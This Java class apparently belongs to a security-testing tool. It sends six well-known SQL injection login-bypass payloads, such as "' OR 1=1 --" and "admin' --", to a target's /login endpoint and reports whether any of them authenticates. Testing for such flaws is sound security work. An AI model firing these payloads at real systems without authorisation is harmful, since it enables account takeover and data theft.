package attacks;

import model.AttackResult;
import util.HttpUtil;

public class SqlInjectionAttack {

    public static AttackResult run(String baseUrl) {

        String[] payloads = {
            "' OR 1=1 --",
            "' OR '1'='1",
            "admin' --",
            "' OR 1=1#",
            "1' OR '1' = '1",
            "' UNION SELECT NULL--"
        };

        for (String injection : payloads) {
            String payload = String.format("""
            {
              "username": "%s",
              "password": "anything"
            }
            """, injection);

            String response = HttpUtil.post(baseUrl + "/login", payload);

            if (response.contains("success") || response.contains("token") || 
                response.contains("authenticated")) {
                
                String details = String.format("SQL injection successful using payload: '%s'. Response: %s", 
                    injection, truncate(response, 150));
                    
                return new AttackResult("SQL Injection", true, details);
            }
        }

        return new AttackResult("SQL Injection", false, 
            "No SQL injection vulnerability detected. Tested " + payloads.length + " payloads");
    }

    private static String truncate(String str, int maxLength) {
        if (str.length() <= maxLength) return str;
        return str.substring(0, maxLength) + "...";
    }
}
